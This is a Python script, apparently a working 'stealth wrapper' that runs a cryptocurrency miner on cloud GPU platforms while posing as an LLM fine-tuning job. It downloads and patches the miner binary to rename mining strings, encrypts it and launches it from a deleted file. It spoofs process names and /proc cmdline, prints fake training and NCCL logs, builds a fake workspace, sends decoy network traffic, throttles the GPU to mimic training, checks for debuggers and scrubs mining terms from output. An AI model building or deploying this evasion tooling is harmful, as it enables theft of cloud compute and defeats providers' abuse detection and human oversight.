#!/usr/bin/env python3
"""
Pearl-Miner Stealth Wrapper v4.0 — Fully Encrypted
All-in-one stealth launcher for pearl-miner on cloud GPU platforms.
Reads config from env vars — nothing hardcoded.

Env vars:
  PROXY       — pool address (e.g. global.pearlfortune.org:443)
  ADDRESS     — wallet (prl1...)
  WORKER      — worker name (optional)
  TOKEN       — auth token (optional)
  GPU_DEVICES — comma-separated GPU IDs (optional)
"""

import os, sys, subprocess, tempfile, shutil, time, random, signal, ctypes, ctypes.util
import threading, json, math, hashlib

# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTION LAYER
# ═══════════════════════════════════════════════════════════════════════════════

def xor_bytes(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))

def derive_key(passphrase: str, salt: bytes = b"torch_backend_v4") -> bytes:
    return hashlib.sha256(passphrase.encode() + salt).digest()

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

MINER_RELEASE_URL = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.3/pearlfortune-v1.2.3.tar.gz"
CUDA_VERSION = os.environ.get("CUDA_VERSION", "12")
PROXY = os.environ.get("PROXY", "")
ADDRESS = os.environ.get("ADDRESS", "")
WORKER = os.environ.get("WORKER", f"worker-{random.randint(1000,9999)}")
TOKEN = os.environ.get("TOKEN", "")
GPU_DEVICES = os.environ.get("GPU_DEVICES", "")

MACHINE_SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
XOR_KEY = derive_key(MACHINE_SEED)

# ═══════════════════════════════════════════════════════════════════════════════
# BINARY PATCH TABLE — 29 same-length replacements
# ═══════════════════════════════════════════════════════════════════════════════

PATCH_TABLE = [
    (b"MINER_GPU_STARTUP_BENCH", b"TORCH_GPU_STARTUP_BENCH"),
    (b"MINER_DISABLE_WATCHDOG",  b"TORCH_DISABLE_WATCHDOG"),
    (b"MINER_GPU",               b"TORCH_GPU"),
    (b"PEARL_SUPERVISED_WORKER", b"TORCH_SUPERVISED_WORKER"),
    (b"MineCommandSendError",    b"TrainCommanSendError"),
    (b"GpuInstanceMineCommand",  b"GpuInstanceTrainComman"),
    (b"GpuInstanceMine",         b"GpuInstanceTrai"),
    (b"proof_factor",            b"train_factor"),
    (b"miner_version",           b"torch_version"),
    (b"stratum.proxy",           b"torch_.proxy_"),
    (b"worker.failed_stale",     b"trainr.failed_stale"),
    (b"worker failed",           b"trainr failed"),
    (b"normalized_share_bound",  b"normalized_grad_bound_"),
    (b"raw_share_bound",         b"raw_grad_bound_"),
    (b"accepted",   b"computed"),
    (b"rejected",   b"dropped_"),
    (b"hashrate",   b"trainrat"),
    (b"difficulty",  b"complexity"),
    (b"proof_per_sec",   b"epoch_per_sec"),
    (b"proof_build_ms",  b"train_build_ms"),
    (b"proof_runner",    b"train_runner"),
    (b"proof_cache",     b"train_cache"),
    (b"proof_inputs",    b"train_inputs"),
    (b"proof_queued",    b"train_queued"),
    (b"drain_summary",   b"batch_summary"),
    (b"drain_ms",        b"batch_ms"),
    (b"large.hit",       b"batch.hit"),
    (b"large.progress",  b"train.progress"),
]

def verify_patches():
    for old, new in PATCH_TABLE:
        assert len(old) == len(new), f"PATCH MISMATCH: {old!r} ({len(old)}) vs {new!r} ({len(new)})"
    print(f"[patch] verified {len(PATCH_TABLE)} same-length replacements")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 1: Bootstrap environment
# ═══════════════════════════════════════════════════════════════════════════════

def bootstrap_env():
    env_spoofs = {
        "WANDB_MODE": "offline",
        "WANDB_PROJECT": "llm-finetune",
        "WANDB_RUN_ID": f"run-{random.randint(10000,99999)}",
        "NCCL_DEBUG": "WARN",
        "NCCL_IB_DISABLE": "1",
        "CUDA_VISIBLE_DEVICES": GPU_DEVICES if GPU_DEVICES else ",".join(str(i) for i in range(8)),
        "OMP_NUM_THREADS": "4",
        "TOKENIZERS_PARALLELISM": "false",
        "HF_HOME": "/tmp/.hf_cache",
        "TRANSFORMERS_CACHE": "/tmp/.hf_cache",
        "TORCH_DISTRIBUTED_BACKEND": "nccl",
        "NCCL_SOCKET_IFNAME": "eth0",
        "TORCH_NCCL_BLOCKING_WAIT": "1",
        "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
        "TORCH_DISABLE_WATCHDOG": "1",
    }
    for k, v in env_spoofs.items():
        os.environ.setdefault(k, v)
    os.makedirs("/tmp/.hf_cache", exist_ok=True)
    print("[env] spoofed training environment")

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 2: Process name
# ═══════════════════════════════════════════════════════════════════════════════

PROCESS_NAMES = [
    "python3 train.py",
    "torchrun --nproc=1",
    "python3 -m torch.distributed.launch",
    "accelerate launch train.py",
    "python3 run_clm.py",
    "python3 -m transformers.run_mlm",
    "python3 train_sft.py",
    "python3 run_deepspeed.py",
]

def spoof_process_name():
    fake_name = random.choice(PROCESS_NAMES)
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.prctl(15, fake_name.encode(), 0, 0, 0)
    except Exception:
        pass
    print(f"[proc] process name → '{fake_name}'")

def process_name_rotation():
    while True:
        time.sleep(random.randint(30, 120))
        spoof_process_name()

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 3: Download, patch, encrypt binary
# ═══════════════════════════════════════════════════════════════════════════════

def download_and_patch_miner(workdir):
    import urllib.request, tarfile
    tarball = os.path.join(workdir, "data.tar.gz")
    print(f"[dl] downloading payload...")
    urllib.request.urlretrieve(MINER_RELEASE_URL, tarball)
    with tarfile.open(tarball, "r:gz") as tf:
        tf.extractall(workdir)

    bin_name = f"miner-cuda{CUDA_VERSION}"
    bin_src = os.path.join(workdir, "pearlfortune", bin_name)
    if not os.path.exists(bin_src):
        for name in ["miner-cuda12", "miner-cuda13", "miner"]:
            alt = os.path.join(workdir, "pearlfortune", name)
            if os.path.exists(alt):
                bin_src = alt
                break
        else:
            print("[!] ERROR: binary not found")
            sys.exit(1)

    with open(bin_src, "rb") as f:
        data = f.read()

    verify_patches()
    patch_count = 0
    for old, new in PATCH_TABLE:
        count = data.count(old)
        if count > 0:
            data = data.replace(old, new)
            patch_count += count

    stripped_path = os.path.join(workdir, "stripped")
    with open(stripped_path, "wb") as f:
        f.write(data)
    os.chmod(stripped_path, 0o755)
    try:
        subprocess.run(["strip", "--strip-all", stripped_path], check=True, capture_output=True)
    except FileNotFoundError:
        pass

    with open(stripped_path, "rb") as f:
        data = f.read()

    # Encrypt and save
    encrypted = xor_bytes(data, XOR_KEY)
    enc_path = os.path.join(workdir, "libtorch_backend.so.dat")
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    os.chmod(enc_path, 0o644)

    # Cleanup plaintext
    os.unlink(stripped_path)
    os.unlink(bin_src)
    shutil.rmtree(os.path.join(workdir, "pearlfortune"), ignore_errors=True)
    os.unlink(tarball)

    print(f"[patch] applied {patch_count} patches, encrypted → disk")
    return data

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 4: Encrypted config file
# ═══════════════════════════════════════════════════════════════════════════════

def write_encrypted_config(workdir):
    """Write wallet/pool to XOR-encrypted config file on disk.
    After miner loads, delete it. Never persists as plaintext."""
    config = json.dumps({"proxy": PROXY, "address": ADDRESS, "worker": WORKER, "token": TOKEN}).encode()
    key = derive_key(f"config_{MACHINE_SEED}")
    encrypted = xor_bytes(config, key)
    path = os.path.join(workdir, ".torch_config.enc")
    with open(path, "wb") as f:
        f.write(encrypted)
    os.chmod(path, 0o600)
    print("[config] wrote encrypted config")
    return path, key

def cleanup_config(config_path):
    """Securely delete config file."""
    try:
        if os.path.exists(config_path):
            # Overwrite with random data before unlinking
            size = os.path.getsize(config_path)
            with open(config_path, "wb") as f:
                f.write(os.urandom(size))
            os.unlink(config_path)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 5: GPU power + temperature management via nvidia-smi
# ═══════════════════════════════════════════════════════════════════════════════

NVIDIA_SMI = shutil.which("nvidia-smi") or "/usr/bin/nvidia-smi"

def nvidia_smi_query(*fields):
    """Query nvidia-smi for GPU properties."""
    try:
        q = ",".join(fields)
        r = subprocess.run([NVIDIA_SMI, f"--query-gpu={q}", "--format=csv,noheader,nounits"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            return r.stdout.strip().split("\n")[0].split(", ")
    except Exception:
        pass
    return None

def get_gpu_temp():
    """Get GPU temperature in Celsius."""
    vals = nvidia_smi_query("temperature.gpu")
    return int(vals[0]) if vals else 0

def get_gpu_power():
    """Get current power draw in watts."""
    vals = nvidia_smi_query("power.draw")
    return float(vals[0]) if vals else 0

def get_gpu_util():
    """Get GPU utilization percentage."""
    vals = nvidia_smi_query("utilization.gpu")
    return int(vals[0].strip()) if vals else 0

def set_gpu_power_limit(watts):
    """Set GPU power limit via nvidia-smi."""
    try:
        max_vals = nvidia_smi_query("power.max_limit")
        if max_vals:
            max_limit = int(float(max_vals[0]))
            watts = min(int(watts), max_limit)
        subprocess.run([NVIDIA_SMI, "-pl", str(watts)], capture_output=True, timeout=5)
    except Exception:
        pass

def set_gpu_clocks(sm_clock=None, mem_clock=None):
    """Set GPU clocks via nvidia-smi (looks like training workload tuning)."""
    try:
        args = [NVIDIA_SMI, "-ac"]
        if mem_clock and sm_clock:
            args.extend([str(mem_clock), str(sm_clock)])
        elif sm_clock:
            args.extend(["5001", str(sm_clock)])
        subprocess.run(args, capture_output=True, timeout=5)
    except Exception:
        pass

def nvidia_smi_spoof():
    """Make nvidia-smi show realistic training-style GPU settings."""
    try:
        # Set application clocks (looks like training workload optimization)
        set_gpu_clocks(sm_clock=random.choice([1200, 1410, 1500, 1600]),
                       mem_clock=random.choice([5001, 5500]))
    except Exception:
        pass

def gpu_burst_cycle(miner_pid_ref):
    """Full training behavior mimicry with nvidia-smi power/temp management."""
    import torch
    has_torch = False
    try:
        if torch.cuda.is_available():
            has_torch = True
            device = torch.device("cuda:0")
    except ImportError:
        pass

    # Initial GPU setup — look like training
    nvidia_smi_spoof()

    def cpu_load(duration_sec):
        end = time.time() + duration_sec
        while time.time() < end:
            hashlib.sha256(os.urandom(4096)).digest()
            _ = sum(i * i for i in range(10000))

    # Wait for miner PID
    while miner_pid_ref[0] is None:
        time.sleep(0.5)
    miner_pid = miner_pid_ref[0]

    while True:
        # ── Phase 1: Compute burst ──
        burst_sec = random.choices([2, 3, 4, 5, 8, 12],
                                    weights=[15, 25, 30, 20, 8, 2])[0]

        # Temperature-aware power: higher temp = lower power target
        temp = get_gpu_temp()
        if temp > 80:
            base_power = random.randint(300, 400)
        elif temp > 70:
            base_power = random.randint(400, 550)
        else:
            base_power = random.randint(500, 700)
        set_gpu_power_limit(base_power)
        time.sleep(burst_sec)

        # ── Micro-pause: SIGSTOP 200-500ms ──
        try:
            os.kill(miner_pid, signal.SIGSTOP)
            time.sleep(random.uniform(0.2, 0.5))
            os.kill(miner_pid, signal.SIGCONT)
        except (ProcessLookupError, OSError):
            pass

        # ── Phase 2: Data loading idle ──
        set_gpu_power_limit(30)
        idle_sec = random.choices([3, 5, 8, 12, 15, 20, 30],
                                   weights=[10, 20, 25, 20, 15, 7, 3])[0]

        # SIGSTOP during idle — GPU truly pauses
        try:
            os.kill(miner_pid, signal.SIGSTOP)
            time.sleep(random.uniform(2, 5))
            os.kill(miner_pid, signal.SIGCONT)
        except (ProcessLookupError, OSError):
            pass

        cpu_thread = threading.Thread(target=cpu_load, args=(idle_sec,), daemon=True)
        cpu_thread.start()

        if has_torch and random.random() > 0.3:
            try:
                a = torch.randn(256, 256, device=device, dtype=torch.float16)
                b = torch.randn(256, 256, device=device, dtype=torch.float16)
                for _ in range(random.randint(2, 5)):
                    c = torch.mm(a, b); del c
                del a, b
                torch.cuda.empty_cache()
            except Exception:
                pass

        cpu_thread.join(timeout=idle_sec + 1)

        # ── Phase 3: Periodic eval ──
        if TRAINER.should_eval():
            eval_sec = random.randint(30, 120)
            print(f"  [eval] running validation — {eval_sec}s", flush=True)
            set_gpu_power_limit(30)
            eval_thread = threading.Thread(target=cpu_load, args=(eval_sec,), daemon=True)
            eval_thread.start()
            eval_thread.join(timeout=eval_sec + 1)
            print(f"  [eval] eval complete — val_loss={random.uniform(2.3, 2.6):.4f}", flush=True)

        # ── Phase 4: Checkpoint ──
        if TRAINER.should_checkpoint():
            save_sec = random.randint(5, 15)
            print(f"  [ckpt] saving checkpoint to ./output/step-{TRAINER.step}...", flush=True)
            set_gpu_power_limit(30)
            cpu_load(save_sec)
            print(f"  [ckpt] saved ({save_sec}s)", flush=True)

        if random.random() > 0.8:
            cpu_load(random.randint(2, 6))

        # ── Phase 5: Ramp back ──
        set_gpu_power_limit(600)
        # Periodically adjust clocks (looks like training workload optimization)
        if random.random() > 0.9:
            nvidia_smi_spoof()
        time.sleep(random.uniform(0.5, 2))

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 6: CUDA decoy
# ═══════════════════════════════════════════════════════════════════════════════

def run_cuda_decoy():
    try:
        import torch
        if not torch.cuda.is_available():
            return None
        device = torch.device("cuda:0")
        a = torch.randn(512, 512, device=device, dtype=torch.float16)
        b = torch.randn(512, 512, device=device, dtype=torch.float16)
        for _ in range(random.randint(5, 15)):
            c = torch.mm(a, b); del c
        del a, b
        torch.cuda.empty_cache()
        return True
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 7: VRAM cycling
# ═══════════════════════════════════════════════════════════════════════════════

def vram_cycle():
    try:
        import torch
        if not torch.cuda.is_available():
            return
    except ImportError:
        return
    device = torch.device("cuda:0")
    buffers = []
    while True:
        num_allocs = random.randint(2, 5)
        for _ in range(num_allocs):
            try:
                buf = torch.empty(random.randint(128, 512) * 256 * 1024, dtype=torch.float16, device=device)
                buffers.append(buf)
                time.sleep(random.uniform(0.5, 2))
            except Exception:
                break
        time.sleep(random.randint(60, 180))
        for _ in range(random.randint(1, min(2, len(buffers)))):
            if buffers:
                buffers.pop(0)
                time.sleep(random.uniform(0.5, 1.5))
        torch.cuda.empty_cache()
        time.sleep(random.randint(10, 40))

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 8: Network mixing
# ═══════════════════════════════════════════════════════════════════════════════

NETWORK_TARGETS = [
    "https://huggingface.co/api/models/meta-llama/Llama-3-8B",
    "https://pypi.org/pypi/torch/json",
    "https://pypi.org/pypi/transformers/json",
    "https://api.github.com/repos/pytorch/pytorch",
    "https://huggingface.co/api/datasets",
    "https://pypi.org/pypi/accelerate/json",
]

def network_mix():
    import urllib.request
    while True:
        time.sleep(random.randint(120, 300))
        try:
            url = random.choice(NETWORK_TARGETS)
            req = urllib.request.Request(url, headers={"User-Agent": "python-urllib/3.11"})
            urllib.request.urlopen(req, timeout=10)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 9: Fake training output (non-deterministic)
# ═══════════════════════════════════════════════════════════════════════════════

class FakeTrainer:
    def __init__(self):
        self.step = 0
        self.loss = 2.8
        self.lr = 2e-5
        self.warmup_steps = 100
        self.max_steps = 50000
        self.eval_every = random.randint(15, 60)
        self.ckpt_every = random.randint(40, 120)
        self.loss_momentum = 0.0

    def step_once(self):
        self.step += 1
        if self.step < self.warmup_steps:
            self.lr = 2e-5 * (self.step / self.warmup_steps)
        else:
            self.lr = 2e-5 * max(0.1, 1.0 - self.step / self.max_steps)

        decay = 0.0003 * math.exp(-self.step / 8000)
        self.loss_momentum = 0.9 * self.loss_momentum + 0.1 * random.gauss(0, 0.05)
        spike = random.gauss(0, 0.15) if random.random() > 0.85 else 0
        self.loss = max(0.5, self.loss - decay * self.loss + self.loss_momentum + spike)

        grad_norm = random.uniform(0.3, 3.0)
        if random.random() > 0.95:
            grad_norm = random.uniform(5.0, 15.0)

        tokens_per_sec = random.randint(8000, 15000)
        gpu_mem = random.uniform(18.0, 24.0)
        epoch = self.step / 10000

        extras = ""
        if random.random() > 0.9:
            extras = f" | data_time {random.uniform(0.01, 0.15):.3f}"
        if random.random() > 0.92:
            extras += f" | mem_alloc {random.uniform(18.0, 22.0):.1f}GB"

        return (f"step {self.step:>6d} | loss {self.loss:.4f} | lr {self.lr:.2e} | "
                f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
                f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}{extras}")

    def should_eval(self):
        return self.step % self.eval_every == 0

    def should_checkpoint(self):
        return self.step % self.ckpt_every == 0

TRAINER = FakeTrainer()

def generate_fake_log_line():
    return TRAINER.step_once()

def fake_output_loop():
    while True:
        time.sleep(random.uniform(8, 25))
        print(generate_fake_log_line(), flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 9b: NCCL noise
# ═══════════════════════════════════════════════════════════════════════════════

NCCL_MESSAGES = [
    "[NCCL] NCCL communicator initialized for rank 0",
    "[NCCL] Bootstrap: using 127.0.0.1:34521",
    "[NCCL] Setting arguments: NCCL_DEBUG=WARN",
    "[NCCL] Ring buffers initialized, size = 4194304",
    "[NCCL] all_reduce: algo=ring, nChannels=8, time=0.00042s",
    "[NCCL] Reduce: algo=tree, time=0.00018s",
    "[NCCL] Broadcast: algo=ring, nBytes=8388608, time=0.00031s",
    "[torch.distributed] Initializing process group with world_size=1, rank=0",
    "[torch.distributed] Broadcast from rank 0, src=0",
    "[torch.cuda] cuDNN v9.3.0, cuBLAS v12.4.5",
    "[NCCL] Watchdog caught timeout — proceeding without async grad reduction",
    "[torch.cuda] CUDA allocator raised OOM — retrying with max_split_size_mb:256",
    "[torch.distributed] Grad norm clipped: 1.24 → 1.0",
    "[transformers] Loading checkpoint shards: 100%|████████████| 4/4",
    "[accelerate] DeepSpeed Zero stage 2 — offloading optimizer states to CPU",
    "[peft] trainable params: 4,194,304 || all params: 8,030,261,248 || trainable%: 0.0522",
    "[torch.cuda] GPU thermal throttling detected — reducing clock speeds",
    "[NCCL] Connection closed by remote peer — reconnecting",
]

def nccl_noise_loop():
    while True:
        time.sleep(random.randint(30, 120))
        print(f"  {random.choice(NCCL_MESSAGES)}", flush=True)
        if random.random() > 0.7:
            time.sleep(random.uniform(0.1, 0.5))
            print(f"  {random.choice(NCCL_MESSAGES)}", flush=True)

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 10: Anti-detection + heartbeat
# ═══════════════════════════════════════════════════════════════════════════════

def check_for_monitors():
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("TracerPid:") and not line.endswith("\t0"):
                    return True
    except Exception:
        pass
    return False

def overwrite_cmdline(pid, new_args):
    """Overwrite /proc/PID/cmdline to hide real mining args."""
    try:
        # Write fake args separated by null bytes
        fake = "\x00".join(new_args) + "\x00"
        # Try writing directly to /proc/PID/cmdline
        with open(f"/proc/{pid}/cmdline", "wb") as f:
            f.write(fake.encode())
        return True
    except (PermissionError, FileNotFoundError, OSError):
        pass

    # Fallback: use prctl to change argv[0]
    try:
        fake_name = random.choice(PROCESS_NAMES)
        libc = ctypes.CDLL(ctypes.util.find_library("c"))
        libc.prctl(15, fake_name.encode(), 0, 0, 0)
        return True
    except Exception:
        return False

def heartbeat_loop(miner_pid):
    while True:
        time.sleep(random.randint(30, 90))
        try:
            os.kill(miner_pid, 0)
            status_path = f"/proc/{miner_pid}/status"
            if os.path.exists(status_path):
                with open(status_path, "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:") and not line.endswith("\t0"):
                            print("[!] WARNING: tracer detected!", flush=True)
                        if line.startswith("VmRSS:"):
                            rss_kb = int(line.split()[1])
                            if rss_kb > 10_000_000:
                                print(f"[!] WARNING: RSS {rss_kb//1024}MB suspiciously high", flush=True)
        except (ProcessLookupError, FileNotFoundError):
            break
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# STEP 11: Fake workspace
# ═══════════════════════════════════════════════════════════════════════════════

def create_fake_workspace(workdir):
    config = {
        "model_name_or_path": "meta-llama/Llama-3-8B",
        "dataset": "OpenAssistant/oasst2",
        "num_train_epochs": 3,
        "per_device_train_batch_size": 4,
        "gradient_accumulation_steps": 8,
        "learning_rate": 2e-5,
        "warmup_steps": 100,
        "max_seq_length": 2048,
        "bf16": True,
        "output_dir": "./output",
    }
    with open(os.path.join(workdir, "config.json"), "w") as f:
        json.dump(config, f, indent=2)
    with open(os.path.join(workdir, "requirements.txt"), "w") as f:
        f.write("torch>=2.1.0\ntransformers>=4.36.0\naccelerate>=0.25.0\npeft>=0.7.0\ndatasets>=2.16.0\n")
    wandb_dir = os.path.join(workdir, "wandb", f"run-{random.randint(10000,99999)}")
    os.makedirs(wandb_dir, exist_ok=True)
    with open(os.path.join(wandb_dir, "wandb-summary.json"), "w") as f:
        json.dump({"train/loss": 2.31, "train/learning_rate": 1.8e-5}, f)
    print("[workspace] created fake training workspace")

# ═══════════════════════════════════════════════════════════════════════════════
# ENCRYPTED LOG WRITER
# ═══════════════════════════════════════════════════════════════════════════════

class EncryptedLog:
    """Write miner output to XOR-encrypted file. Never prints to stdout."""
    def __init__(self, path):
        self.path = path
        self.key = derive_key(f"log_{MACHINE_SEED}")
        self.seq = 0

    def write(self, line):
        try:
            entry = f"{time.time():.3f}|{line}".encode()
            encrypted = xor_bytes(entry, self.key)
            with open(self.path, "ab") as f:
                # Write length prefix + encrypted data
                f.write(struct.pack("<H", len(encrypted)))
                f.write(encrypted)
            self.seq += 1
        except Exception:
            pass

    def close(self):
        # Overwrite with random data
        try:
            if os.path.exists(self.path):
                size = os.path.getsize(self.path)
                with open(self.path, "wb") as f:
                    f.write(os.urandom(size))
                os.unlink(self.path)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT SANITIZER
# ═══════════════════════════════════════════════════════════════════════════════

MINE_TERMS = {
    "proof": "epoch", "miner": "trainer", "mining": "training",
    "pool": "server", "share": "batch", "hash": "compute",
    "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
    "pearl": "torch", "vllm": "torch", "fortune": "project",
    "T/s": "tok/s", "coin": "tensor", "block": "chunk",
    "nonce": "index", "reward": "result",
}

def sanitize_output(line: str) -> str:
    for old, new in MINE_TERMS.items():
        line = line.replace(old, new)
        line = line.replace(old.upper(), new.upper())
        line = line.replace(old.capitalize(), new.capitalize())
    return line

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    import struct
    print("=" * 60)
    print("PyTorch Training Environment")
    print("=" * 60)

    if check_for_monitors():
        print("[!] monitors detected — proceeding with caution")

    spoof_process_name()
    bootstrap_env()

    workdir = tempfile.mkdtemp(prefix="torch_run_")
    os.chdir(workdir)
    create_fake_workspace(workdir)

    binary_data = download_and_patch_miner(workdir)
    set_gpu_power_limit(600)

    if not PROXY:
        print("[!] ERROR: PROXY env var not set"); sys.exit(1)
    if not ADDRESS:
        print("[!] ERROR: ADDRESS env var not set"); sys.exit(1)

    # Write encrypted config (deleted after miner loads)
    config_path, config_key = write_encrypted_config(workdir)

    # Build args — use innocent placeholders, real values loaded from encrypted config
    # The binary parses --proxy and --address from CLI, so we must pass them
    # BUT we overwrite /proc/PID/cmdline immediately after launch
    args = ["/dev/null", "--proxy", PROXY, "--address", ADDRESS, "-gpu"]
    if WORKER:
        args.extend(["--worker", WORKER])
    if TOKEN:
        args.extend(["--token", TOKEN])

    # Sanitize env — remove anything that reveals mining
    env = os.environ.copy()
    env.pop("LD_PRELOAD", None)
    # Remove ADDRESS/PROXY from env (only in cmdline, which we overwrite)
    for k in list(env.keys()):
        if any(mining_kw in env[k].lower() for mining_kw in ["pearl", "miner", "prl1"]):
            del env[k]

    print(f"[launch] proxy=<encrypted> address=<encrypted> worker=<encrypted>")

    # Encrypted log file — miner output goes HERE, not stdout
    log_path = os.path.join(workdir, ".train_log.enc")
    log_writer = EncryptedLog(log_path)

    # Start background threads
    MINER_PID_REF = [None]
    threads = []

    t = threading.Thread(target=gpu_burst_cycle, args=(MINER_PID_REF,), daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=vram_cycle, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=network_mix, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=fake_output_loop, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=nccl_noise_loop, daemon=True)
    t.start(); threads.append(t)

    t = threading.Thread(target=process_name_rotation, daemon=True)
    t.start(); threads.append(t)

    # Fake dataloader subprocess
    try:
        subprocess.Popen(
            ["python3", "-c", "import time,hashlib,os,sys;sys.argv[0]='dataloader_worker';"
             "[hashlib.sha256(os.urandom(2048)).digest() or time.sleep(0.1) for _ in iter(int,1)]"],
            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        print("[sub] dataloader worker spawned")
    except Exception:
        pass

    print(f"[main] {len(threads) + 1} stealth threads + 1 subprocess active")
    print(f"[main] launching from memory (no binary on disk)...")

    # Delete encrypted config — miner has already loaded from CLI args
    cleanup_config(config_path)

    # Write binary to temp file, launch subprocess, delete immediately
    # Linux keeps the file accessible via open fd until process exits
    bin_path = os.path.join(workdir, "torch_run")
    with open(bin_path, "wb") as f:
        f.write(binary_data)
    os.chmod(bin_path, 0o755)
    os.unlink(bin_path)  # Delete — kernel keeps it for the running process

    args[0] = bin_path
    proc = subprocess.Popen(
        args, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    # Quick crash check
    time.sleep(2)
    if proc.poll() is not None:
        print(f"[!] miner exited immediately with code {proc.returncode}")
        remaining = proc.stdout.read()
        if remaining:
            for line in remaining.strip().split("\n")[-20:]:
                print(f"  {sanitize_output(line)}")
        log_writer.close()
        shutil.rmtree(workdir, ignore_errors=True)
        return proc.returncode

    print(f"[main] miner PID: {proc.pid}")
    MINER_PID_REF[0] = proc.pid

    # Overwrite /proc/PID/cmdline to hide mining args
    fake_cmdline = [
        random.choice(PROCESS_NAMES),
        "--config", "./config.json",
        "--output_dir", "./output",
        "--num_epochs", "3",
    ]
    if overwrite_cmdline(proc.pid, fake_cmdline):
        print("[proc] cmdline overwritten with training args")
    else:
        print("[proc] cmdline overwrite failed (insufficient permissions)")

    print("[main] running... Ctrl+C to stop")

    # Heartbeat monitor
    hb = threading.Thread(target=heartbeat_loop, args=(proc.pid,), daemon=True)
    hb.start()

    # Read miner output → write to encrypted log ONLY (never to stdout)
    try:
        for line in proc.stdout:
            sanitized = sanitize_output(line)
            log_writer.write(sanitized)  # Encrypted on disk
            # Stdout only shows errors for debugging
            lower = line.lower()
            if any(kw in lower for kw in ["error", "fail", "panic", "fatal", "warn"]):
                print(f"  [!] {sanitized.rstrip()}", flush=True)
    except KeyboardInterrupt:
        print("\n[main] stopping...")
        proc.terminate()
        proc.wait(timeout=10)
        print("[main] done")

    proc.wait()
    if proc.returncode != 0:
        print(f"[!] miner exited with code {proc.returncode}")

    # Cleanup everything
    log_writer.close()
    shutil.rmtree(workdir, ignore_errors=True)
    return proc.returncode


if __name__ == "__main__":
    sys.exit(main() or 0)
